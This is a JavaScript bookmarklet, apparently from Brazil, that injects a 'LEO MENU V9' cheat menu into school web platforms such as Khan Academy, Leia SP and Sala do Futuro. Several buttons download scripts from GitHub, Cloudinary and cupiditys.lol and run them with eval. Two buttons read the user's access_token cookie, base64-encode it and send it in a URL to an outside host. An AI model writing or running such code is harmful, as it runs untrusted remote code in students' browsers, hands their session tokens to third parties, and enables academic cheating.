javascript:(() => {
const style = document.createElement("style");
style.innerHTML = `
@keyframes glowYellowNeon {0% { box-shadow: 0 0 8px #00aaff, 0 0 15px #00bbff; }50% { box-shadow: 0 0 20px #00aaff, 0 0 30px #00bbff; }100% { box-shadow: 0 0 8px #00aaff, 0 0 15px #00bbff; }}
@keyframes rgbBorder {0%,100% { border-color: #00aaff; box-shadow: 0 0 15px #00aaff; }33% { border-color: #00bbff; box-shadow: 0 0 15px #00bbff; }66% { border-color: #0088cc; box-shadow: 0 0 15px #0088cc; }}
@keyframes glowBlackNeon {0% { box-shadow: 0 0 6px #000000, 0 0 12px #111111; }50% { box-shadow: 0 0 15px #000000, 0 0 25px #111111; }100% { box-shadow: 0 0 6px #000000, 0 0 12px #111111; }}
@keyframes glowTitle {0% { text-shadow: 0 0 5px #00aaff, 0 0 10px #00bbff; }50% { text-shadow: 0 0 20px #0088cc, 0 0 40px #00aaff; }100% { text-shadow: 0 0 5px #00aaff, 0 0 10px #00bbff; }}
@keyframes fadeInOut {0% { opacity: 0; } 10% { opacity: 1; } 90% { opacity: 1; } 100% { opacity: 0; }}

.rgb-button { background: linear-gradient(45deg, #000022, #001144); color: #00aaff; border: 2px solid #00aaff; padding: 12px 15px; margin: 10px 0; font-weight: bold; border-radius: 10px; cursor: pointer; animation: glowYellowNeon 1.5s infinite alternate; width: 100%; box-sizing: border-box; font-size: 16px; transition: background 0.3s ease; text-shadow: 0 0 5px #00aaff; }
.rgb-button:hover { filter: brightness(1.3); background: linear-gradient(45deg, #000033, #002266); }

.rgb-fechar-x { position: absolute; top: 8px; right: 12px; color: #00aaff; font-weight: bold; font-size: 18px; cursor: pointer; text-shadow: 0 0 6px #00aaff; z-index: 3; }

.flutuante { position: fixed; bottom: 80px; right: 20px; width: 60px; height: 60px; border-radius: 50%; box-shadow: 0 0 20px #00aaff, 0 0 35px #00bbff; z-index: 9999; cursor: pointer; animation: glowYellowNeon 2s infinite alternate; overflow: hidden; }
.flutuante video { width: 100%; height: 100%; object-fit: cover; pointer-events: none; border-radius: 50%; }
@media(max-width:600px) { .flutuante { width: 50px; height: 50px; } .rgb-button { font-size: 14px; padding: 10px; } }

.aviso-texto { margin-top: 15px; background: rgba(0,0,34,0.7); border: 2px solid #00aaff; border-radius: 10px; padding: 10px; font-size: 14px; color: #00aaff; font-weight: bold; text-align: center; white-space: pre-line; user-select: none; animation: glowYellowNeon 3s infinite alternate; text-shadow: 0 0 8px #00aaff; }

#leoIntro { position: fixed; inset:0; display:flex; justify-content:center; align-items:center; background: rgba(0,0,0,0.6); z-index: 10001; color:#00aaff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; font-size:18px; text-align:center; padding:20px; border-radius:15px; flex-direction:column; overflow:hidden; }
#leoIntro video.bgVideoIntro { position:absolute; inset:0; width:100%; height:100%; object-fit:cover; z-index:0; pointer-events:none; filter: brightness(0.6); }
#leoIntro div { position: relative; z-index:2; }
#leoIntro button { margin-top:15px; padding:10px 15px; font-size:16px; border-radius:10px; border:none; cursor:pointer; font-weight:bold; background:linear-gradient(45deg,#00aaff,#0088cc); color:#000; text-shadow:0 0 5px #00aaff; z-index:2; }
#leoIntro button:hover { background: linear-gradient(45deg,#0088cc,#006699); }

/* ===== RESTO DO SEU CSS EXISTENTE ===== */
#bobMenu { position: fixed; top: 100px; left: 10px; width: 360px; aspect-ratio: 3/4; overflow: hidden; border: 2px solid #00aaff; border-radius: 15px; padding: 20px; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; color: #00aaff; box-shadow: 0 0 20px rgba(0,170,255,0.7); animation: glowYellowNeon 1s infinite alternate; user-select: none; z-index: 9999; }
#bobMenu video.menuBg { position: absolute; inset: 0; width: 100%; height: 100%; object-fit: cover; z-index: 0; filter: brightness(1.3); pointer-events: none; border-radius: 15px; }
#menuContent { position: relative; z-index: 2; height: 100%; overflow-y: auto; padding-right: 10px; }
#bobMenu h3 { position: relative; z-index: 2; color: #00aaff; font-size: 22px; margin-bottom: 15px; display: flex; align-items: center; justify-content: center; gap: 8px; font-weight: bolder; font-family: 'Segoe UI Black', Tahoma, Geneva, Verdana, sans-serif; animation: glowTitle 2s infinite alternate; }
#bobMenu button { position: relative; z-index: 2; }

#bobMenu::-webkit-scrollbar { width: 0px; background: transparent; }
#bobMenu { -ms-overflow-style: none; scrollbar-width: none; }

#loginOverlay { position: fixed; inset: 0; background: rgba(0,0,51,0.85); display: flex; justify-content: center; align-items: center; z-index: 10000; user-select: none; }
#loginBox { position: relative; width: 340px; max-width: calc(100% - 40px); min-height: 500px; border-radius: 15px; overflow-y: auto; box-shadow: 0 0 25px #00aaff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; color: #00aaff; text-align: center; cursor: default; border: 4px solid; animation: rgbBorder 6s linear infinite; box-sizing: border-box; display: flex; flex-direction: column; align-items: center; padding: 20px; }
#loginBox video.loginBg { position: absolute; inset: 0; width: 100%; height: 100%; object-fit: cover; filter: brightness(1.2); z-index: 1; }
#loginContent { position: relative; z-index: 2; padding: 28px 24px; display: flex; flex-direction: column; justify-content: center; width: 100%; gap: 10px; }
#loginContent h2 { margin-bottom: 12px; font-weight: bolder; text-shadow: 0 0 10px #00aaff; }
#loginContent input { width: 100%; max-width: 100%; box-sizing: border-box; display: block; padding: 14px 12px; margin: 8px 0 14px 0; border-radius: 8px; border: 2px solid #00aaff; background: #000033; color: #00aaff; font-size: 16px; outline: none; box-shadow: inset 0 0 8px #00aaff; }
#loginContent input:focus { border-color: #00bbff; box-shadow: 0 0 12px #00bbff; }
#loginContent button { background: linear-gradient(45deg, #00aaff, #0088cc); border: none; color: #000; font-weight: bold; font-size: 18px; padding: 12px; border-radius: 10px; cursor: pointer; text-shadow: 0 0 5px #00aaff; }
#loginContent button:hover { background: linear-gradient(45deg, #0088cc, #006699); }
#loginError { color: #ff4c4c; font-weight: bold; margin-bottom: 10px; display: none; text-shadow: 0 0 5px #ff4c4c; }
#welcomeMessage, #creditsMessage { position: fixed; top: 30%; left: 50%; transform: translate(-50%, -50%); background: linear-gradient(135deg, #000000, #001133); color: #00aaff; font-size: 26px; font-weight: 900; padding: 30px 40px; border-radius: 15px; box-shadow: 0 0 30px #00aaff; text-align: center; font-family: 'Segoe UI Black', Tahoma, Geneva, Verdana, sans-serif; z-index: 10001; user-select: none; opacity: 0; animation: fadeInOut 4s forwards; }
#donateBtn { animation: glowBlackNeon 2s infinite alternate; }

.rgb-section-title { font-size: 18px; font-weight: bold; margin-top: 15px; margin-bottom: 5px; text-align: center; color: #00aaff; text-shadow: 0 0 6px #00aaff; }
`;
document.head.appendChild(style);

let loggedIn = false;

// ===== MENSAGEM INICIAL =====
const mostrarIntro = () => {
    if(document.getElementById("leoIntro")) return;
    const intro = document.createElement("div");
    intro.id = "leoIntro";
    intro.innerHTML = `
      <video class="bgVideoIntro" autoplay loop muted src="https://motionbgs.com/media/4605/i-am-free-anonymous.960x540.mp4"></video>
      <div>CRIADO POR LEONARDO F.G DE ALMEIDA<br>
      APOIE ELE SE VC GOSTA DO MEU TRABALHO<br>
      TAMO JUNTO SEMPRE GALERA E NOIS<br>
      OBRIGADO POR VCS FAZER PARTE DA MINHA VIDA ❤️</div>
      <button id="leoIntroBtn">Fechar e continuar</button>
    `;
    document.body.appendChild(intro);
    document.getElementById("leoIntroBtn").onclick = () => {
        intro.remove();
        criarLogin();
    };
};

// ===== FUNÇÕES LOGIN, MENU E BOTÕES =====
const criarMenu = () => {
  if(document.getElementById("bobMenu")) return;
  const e = document.createElement("div");
  e.id = "bobMenu";
  e.innerHTML = `<video class="menuBg" autoplay loop muted src="https://motionbgs.com/media/4068/silver-goku.960x540.mp4"></video><div class="rgb-fechar-x" onclick="this.parentNode.remove()">✖</div><h3>LEO MENU V9</h3><div id="menuContent"></div>`;
  document.body.appendChild(e);
  const menuContent = document.getElementById("menuContent");
  const addButton = (txt, func) => { const b=document.createElement("button"); b.innerText=txt; b.className="rgb-button"; if(func) b.onclick=func; menuContent.appendChild(b); };

  addButton("📚 KHAN ACADEMY", ()=>{fetch("https://raw.githubusercontent.com/Niximkk/Khanware/refs/heads/main/Khanware.js").then(r=>r.text()).then(eval)});
  addButton("✅ TAREFA HACK V.10", ()=>{window.open("https://taskitos.cupiditys.lol/","_blank")});
  addButton("📝 REDAÇÃO HACK", ()=>{window.open("https://redacao.cupiditys.lol/","_blank")});
  addButton("📖 LEIA SP HACK V.7", ()=>{try{const token=document.cookie.split('access_token=')[1].split(';')[0]; const encoded=encodeURIComponent(btoa(token)); window.open(`https://leiasp.cupiditys.lol/?key=${encoded}`,"_blank")}catch{alert("❌ Token não encontrado.")}});
  addButton("📌 KHAN AUTOMÁTICO v.1", ()=>{fetch("https://raw.githubusercontent.com/Snowxyrzk/Khan-Destroyer/refs/heads/main/SCRIPT.js").then(t=>t.text()).then(eval)});
  addButton("🎤 SPEAK V2 MOD", ()=>{ fetch("https://speakify.cupiditys.lol/api/bookmark.js").then(r=>r.text()).then(eval).catch(()=>alert("❌ Erro ao carregar SPEAK V2 MOD.")) });
  addButton("☠️ MOD PROVA", ()=>{fetch("https://res.cloudinary.com/dctxcezsd/raw/upload/v1745012111/saladofuturo.js").then(t=>t.text()).then(eval)});
  addButton("💻 MOD ALURA", ()=>{alert("❌ Código ainda não disponível. Substitua por seu script quando tiver.");});
  addButton("🎓 EDUCAÇÃO PROFISSIONAL", ()=>{try { const token = document.cookie.split('access_token=')[1].split(';')[0]; const encodedToken = encodeURIComponent(btoa(token)); window.open(`https://educacaoprofissional.educacao.sp.gov.br/my/courses.php?key=${encodedToken}`, "_blank"); } catch { alert("❌ Não foi possível acessar o Sala do Futuro. Faça login na Educação Profissional primeiro."); }});

  const titulo = document.createElement("div");
  titulo.className = "rgb-section-title";
  titulo.innerText = "📘 Apostilas";
  menuContent.appendChild(titulo);

  addButton("📚 Geografia e História - Volume 3", ()=>{window.open("https://acervocmsp.educacao.sp.gov.br/138038/1262582.pdf","_blank")});
  addButton("📚 Matemática e Português - Volume 3", ()=>{window.open("https://acervocmsp.educacao.sp.gov.br/138013/1262487.pdf","_blank")});
  addButton("📚 Física, Biologia, Química - Volume 3", ()=>{window.open("https://acervocmsp.educacao.sp.gov.br/138040/1262595.pdf","_blank")});

  // ===== NOVA SEÇÃO: IA =====
  const tituloIA = document.createElement("div");
  tituloIA.className = "rgb-section-title";
  tituloIA.innerText = "🤖 IA";
  menuContent.appendChild(tituloIA);

  addButton("💬 ChatGPT MOD", () => {
      alert("🚧 Código ainda não disponível.");
  });

  const aviso=document.createElement("div"); aviso.className="aviso-texto"; aviso.innerText="⚠️ Use com responsabilidade!\nLEO MENU V9 - VIP"; menuContent.appendChild(aviso);
  mostrarCreditos();
};

const mostrarMensagemBoasVindas=()=>{const msg=document.createElement("div"); msg.id="welcomeMessage"; msg.innerText="🎉 Bem-vindo, LEO! 🎉"; document.body.appendChild(msg); setTimeout(()=>{msg.remove();},4000);}
const mostrarCreditos=()=>{const c=document.createElement("div"); c.id="creditsMessage"; c.innerText="💻 Mod Menu VIP Criado por Leonardo F.G 💻"; document.body.appendChild(c); setTimeout(()=>{c.remove();},4000);}

const criarLogin=()=>{ 
  if(document.getElementById("loginOverlay")) return;
  const overlay=document.createElement("div"); overlay.id="loginOverlay";
  overlay.innerHTML=`<div id="loginBox"><video class="loginBg" autoplay loop muted src="https://motionbgs.com/media/387/goku-from-dragon-ball-fighter-z.960x540.mp4"></video><div id="loginContent"><h2>Login</h2><div id="loginError">Usuário ou senha incorretos!</div><input type="text" id="loginUser" placeholder="Usuário"/><input type="password" id="loginPass" placeholder="Senha"/><button id="loginBtn">Entrar</button><button id="donateBtn">💖 Apoiar o Criador / Doar</button></div></div>`;
  document.body.appendChild(overlay);

  document.getElementById("loginBtn").onclick=()=>{
    const user=document.getElementById("loginUser").value.trim();
    const pass=document.getElementById("loginPass").value.trim();
    if(user==="LEO" && pass==="V9"){overlay.remove(); loggedIn=true; mostrarMensagemBoasVindas(); criarMenu();}
    else document.getElementById("loginError").style.display="block";
  };
  document.getElementById("donateBtn").onclick=()=>window.open("https://pixgg.com/LEO_MODS_OFC","_blank");

  overlay.querySelectorAll("input").forEach(input=>input.addEventListener("keydown", e=>{if(e.key==="Enter") document.getElementById("loginBtn").click();}));
};

const botaoFlutuante=document.createElement("div");
botaoFlutuante.className="flutuante";
botaoFlutuante.title="Abrir LEO MENU V9";
botaoFlutuante.style.animation = "none";
botaoFlutuante.style.boxShadow = "none";
botaoFlutuante.innerHTML=`<video autoplay loop muted src="https://motionbgs.com/media/2300/joker.960x540.mp4"></video>`;
botaoFlutuante.onclick=()=>loggedIn?criarMenu():mostrarIntro();
document.body.appendChild(botaoFlutuante);

// ===== MOSTRAR A INTRO NA INICIALIZAÇÃO =====
mostrarIntro();
})();
